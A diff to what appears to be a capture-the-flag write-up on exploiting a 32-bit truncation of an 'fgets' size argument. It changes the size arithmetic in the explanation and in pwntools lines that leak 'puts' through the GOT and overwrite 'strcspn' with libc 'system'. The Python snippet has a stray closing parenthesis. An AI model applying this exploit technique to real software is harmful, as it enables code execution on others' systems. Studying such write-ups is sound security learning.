@@ -94,7 +94,7 @@ The `local_48 - local_40` passed to `fgets` is problematic, if `local_48` is ver
 To get a reasonable [small] input for `fgets` we need to find the right value of `local_48` reduced by `local_40` then _anded_ with `0xffffffff` (this is the `int param_2` from `prompt_fgets`; we are calling a function with an `unsigned long` as an input, however the function is expecting an `int` (32-bit), so we can assume only the lower 32-bits will be used).
 
 ```python
-2**64 - (2**32 - target) + size)
+2**64 - 2**32 + target + size)
 ```
 
 You can work out the math yourself, but this will properly set `local_48` and `local_40` so that `malloc` nulls out, leaving our target address in `local_40` to satisfy the _where_ (`local_30 = (void *)((long)local_30 + local_40);`), and `local_48 - local_40` will just end up something like `0xffffffff0000000a` that when reduced to 32-bits by `prompt_fgets` will be a `size` of `0xa` in this example.
@@ -140,7 +140,7 @@ Standard pwntools setup, however I added the symbol `names`, and have my local p
 p.sendlineafter('> ','1')
 p.sendlineafter('> ','0')
 p.sendlineafter('> ','blah')
-p.sendlineafter('> ',str(2**64 - (2**32 - binary.sym.names) + 10))
+p.sendlineafter('> ',str(2**64 - 2**32 + binary.sym.names + 10))
 p.sendlineafter('> ',str(binary.sym.names))
 p.sendlineafter('> ',p64(binary.got.puts))
 p.sendlineafter('> ','N')
@@ -160,7 +160,7 @@ Based on the analysis above this should be fairly clear.  Just add an entry, nam
 p.sendlineafter('> ','1')
 p.sendlineafter('> ','1')
 p.sendlineafter('> ','blah')
-p.sendlineafter('> ',str(2**64 - (2**32 - binary.got.strcspn) + 10))
+p.sendlineafter('> ',str(2**64 - 2**32 + binary.got.strcspn + 10))
 p.sendlineafter('> ',str(binary.got.strcspn))
 p.sendlineafter('> ',p64(libc.sym.system))
 p.sendlineafter('> ','N')
